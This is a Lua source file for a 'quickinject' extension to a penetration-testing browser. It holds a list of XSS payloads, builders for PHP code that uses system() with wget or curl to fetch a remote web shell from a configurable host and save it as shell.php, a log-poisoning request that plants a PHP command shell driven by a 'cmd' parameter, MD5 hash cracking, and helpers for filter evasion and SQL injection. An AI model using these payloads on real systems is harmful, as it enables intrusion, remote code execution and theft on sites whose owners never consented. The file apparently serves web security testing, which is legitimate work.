quickinject = {}
quickinject.opt_shellurl = 'quickinject.shell.php.url'
quickinject.opt_shelloutput = 'quickinject.shell.php.out'

quickinject.xss = {
 alert           = [[<script>alert('XSS');</script>]],
 alertcharcode   = [[alert(String.fromCharCode(88,83,83))]],
 alert22         = [[>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>]],
 alertobject     = [[<object type=text/html data='javascript:alert(String.fromCharCode(88,83,83));'></object>]],
 alertnoangle    = [[&{alert('XSS')};]],
 alert2B         = [[%22%2Balert(%27XSS%27)%2B%22]],
 alertimage      = [[>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>]],
 alert2          = [[>"'><script>alert('XSS')</script>]],
 alertbackground = [[AK%22%20style%3D%22background:url(javascript:alert(%27XSS%27))%22%20OS%22]],
 alertonload     = [[<body onload='javascript:alert(String.fromCharCode(88,83,83))'></body>]],
 alerttable      = [[<table background='javascript:alert(String.fromCharCode(88,83,83))'></table>'></body>]]
}

quickinject.usefulstrings = {
 lorem_ipsum = "Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum"
}

function quickinject:add()
 reqbuilder.toolbar:addhtmlfile('#toolbar','Huntpad.scx#quickinject/toolbar.html')
 prefs.regdefault(quickinject.opt_shellurl,'http://somehost/shell.txt')
 prefs.regdefault(quickinject.opt_shelloutput,'shell.php')
 require "Forge"
end

function quickinject:editprefs()
 local t = {}
 t.html = Huntpad:getfile('quickinject/prefs.html')
 t.id = 'syhuntquickinject'
 t.options = [[
 quickinject.shell.php.url
 quickinject.shell.php.out
 ]]
 Sandcat.Preferences:EditCustom(t)
end

function quickinject:getshellurl()
 return prefs.get(quickinject.opt_shellurl)
end

function quickinject:getshelloutput()
 return prefs.get(quickinject.opt_shelloutput)
end

function quickinject.getseparatedstring(s)
 return forge.sepchars(s,app.showinputdialog('Separator:',':'))
end

function quickinject:getshelluploadcmd(method)
 local s = ''
 if method == 'wget' then
  s = string.format([[wget %s -O %s]],quickinject:getshellurl(),quickinject:getshelloutput())
 end
 if method == 'curl' then
  s = string.format([[curl -o %s %s]],quickinject:getshelloutput(),quickinject:getshellurl())
 end
 return s
end

function quickinject:getshelluploadcode(method)
 local s = ''
 if method == 'wget' or 'curl' then
  s = string.format([[<? system('%s'); ?>]],quickinject:getshelluploadcmd(method))
 end
 if method == 'file_get_contents' then
  s = string.format([[<? fwrite(fopen('%s','w'), file_get_contents('%s')); die; ?>]],quickinject:getshelloutput(),quickinject:getshellurl())
 end
 return s
end

function quickinject:viewsheet(filename)
 local source = Huntpad:getfile('quickinject/'..filename)
 tab:showcodeedit(source,'.sql')
end

function quickinject:run(func)
 require 'Underscript'
 Sandcat.reqbuildermenu:run(func)
end

function quickinject.getmyip(func)
 require 'Underscript'
 return forge.myip()
end

function quickinject:getcode()
 local code = reqbuilder.edit.getsel()
 if code == '' then
   code = reqbuilder.edit.gettext()
 end
 return code
end

function quickinject:runjs()
 local code = self:getcode()
 if code ~= '' then
  tab:runjs(code)
 else
  if reqbuilder.request.url ~= '' then
   tab:runjs(reqbuilder.request.url)
  end
 end
end

function quickinject:runtis()
 local code = self:getcode()
  if code ~= '' then
    if browser.navbar ~= nil then
      browser.navbar:eval(code)
    else
      app.runtiscript(code)
    end
  end
end

function quickinject:crackhash(mode)
 local sel = reqbuilder.edit.getsel()
 if sel ~= '' then
  if mode == 'offline' then
   PenTools:CrackMD5()
   MD5CrackPHP.ui.md5.value = sel
  end
  if mode == 'md5decryption.com' then
   if browser.newtab('http://md5decryption.com/') ~= '' then
   tab:loadrequest{
    url = 'http://md5decryption.com/',
    method = 'POST',
    postdata = 'hash='..sel..'&submit=Decrypt+It%21'
   }
   end
  end
 end
end

function quickinject:runas(lang)
 local us = require 'Underscript.Runner'
 local code = self:getcode()
 console.clear()
 local res = us.run[lang](code)
 if res.success == false then
   --app.showmessage('Failed: '..res.errormsg) 
 end
end

-- Runs the code in editor based on the filename extension
function quickinject:runeditorscript()
 local us = require 'Underscript.Runner'
 local code = self:getcode()
 console.clear()
 local ext = ctk.file.getext(reqbuilder.edit.getfilename())
 if ext ~= '' then
   local runfunc = us.runext[ext]
   if runfunc ~= nil then
     runfunc(code)
   else
     app.showmessage(ext:upper()..': not able to run this code language! ')
   end
 end
end

function quickinject:runhash(algo)
 require 'Underscript'
 local sel = reqbuilder.edit.getsel()
 if sel ~= '' then
  reqbuilder.edit.replacesel(forge.hash(algo,sel))
 end
end

function quickinject:sendtojsconsole()
 local sel = reqbuilder.edit.getsel()
 if sel ~= '' then
  browser.options.showconsole = true
  console.setmode('js',true)
  console.setcurline(sel)
 end
end

function quickinject:sendpoison_cmd(method)
 browser.options.showheaders = true
 tab:sendrequest{
  url = ctk.url.combine(reqbuilder.request.url,"/%3C%3Fphp+"..method.."%28%24_GET%5B%27cmd%27%5D%29+%3F%3E")
 }
 reqbuilder.edit.setfocus()
end

function quickinject.getcustomrot(s)
 local n = tonumber(app.showinputdialog('Positions:','13'))
 return forge.rotn(s,n)
end

function quickinject.addtosel(s)
 if ctk.string.isint(s) == true then
  s = tonumber(s)+1
 else
  s = ctk.string.increase(s)
 end
 return s
end

function quickinject.subtosel(s)
 if ctk.string.isint(s) == true then
  s = tonumber(s)-1
 else
  s = ctk.string.decrease(s)
 end
 return s
end

function quickinject:getcustombof(char)
 local n = tonumber(app.showinputdialog('Length:','2048'))
 return string.rep(char,n)
end

function quickinject.getcolumns(statement)
 local n = tonumber(app.showinputdialog('Max Columns:','10'))
 local i = nil
 local s = ''
 if n ~= 0 then
  s = 1
  for i = 2, n do
   s = s..','..i
  end
 end
 s = string.format(statement,s)
 return s
end

-- php's stripslashes()
function quickinject.stripslashes(s)
 s = ctk.string.replace(s,[[\']],[[']])
 s = ctk.string.replace(s,[[\"]],[["]])
 s = ctk.string.replace(s,[[\\]],[[\]])
 return s
end

function quickinject.spacestocommenttags(s)
 return ctk.string.replace(s," ", "/**/")
end

function quickinject.spacestonewlines(s)
 return ctk.string.replace(s," ", "%0a")
end

function quickinject.strtohex_spaced(s)
 return forge.strtohex(s,' ')
end

function quickinject.strtohex_colonsep(s)
 return forge.strtohex(s,':')
end

function quickinject.strtohex_0xhex(s)
 local hex = ctk.convert.strtohex(s)
 if hex ~='' then
  hex = '0x'..hex
 end
 return hex
end
